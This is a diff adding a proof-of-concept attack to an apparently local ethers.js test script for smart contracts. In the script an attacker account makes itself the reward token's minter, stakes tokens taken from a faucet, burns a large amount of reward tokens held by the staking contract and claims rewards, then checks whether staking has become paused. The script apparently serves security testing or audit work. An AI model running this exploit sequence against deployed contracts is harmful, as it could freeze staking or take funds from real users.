@@ -62,6 +62,42 @@ async function main() {
     console.log("   ## NOTIFY REWARD AMOUNT");
 
     //-----------------------------------------------------------------------
+
+    console.log("** INITIAL STATE **");
+
+    const stakingState = await stakingContract.paused();
+    console.log(`   ## IS STAKING PAUSED? ${stakingState}`);
+
+    //-----------------------------------------------------------------------
+
+    console.log("** INITIATE ATTACK **");
+    
+    console.log("   ## SETTING ATTACKER AS MINTER");
+    await rewardContract.connect(attacker).setMinter(attacker.address);
+
+    console.log("   ## REQUESTING STAKING TOKENS FROM FAUCET");
+    await stakingTokenContract.connect(attacker).faucet();
+    const newAttackerStakingTokenBalance = await stakingTokenContract.balanceOf(attacker.address);
+    console.log(`       ## ATTACKER NOW HAS ${ethers.utils.formatEther(newAttackerStakingTokenBalance)} STAKING TOKENS`);
+
+    console.log("   ## APPROVING STAKING CONTRACT TO USER OUR STAKING TOKENS");
+    await stakingTokenContract.connect(attacker).approve(stakingContract.address, ethers.constants.MaxUint256);
+
+    console.log("   ## STAKING");
+    await stakingContract.connect(attacker).stake(newAttackerStakingTokenBalance);
+
+    console.log("   ## BURNING");
+    await rewardContract.connect(attacker).burnFrom(stakingContract.address, ethers.utils.parseEther("1000000"));
+
+    console.log("   ## GETTING REWARDS");
+    await stakingContract.connect(attacker).getReward();
+    //-----------------------------------------------------------------------
+
+    console.log("** DID IT WORK? **");
+
+    const newStakingState = await stakingContract.paused();
+    console.log(`   ## IS STAKING PAUSED? ${newStakingState}`);
+
 }
 
 main()
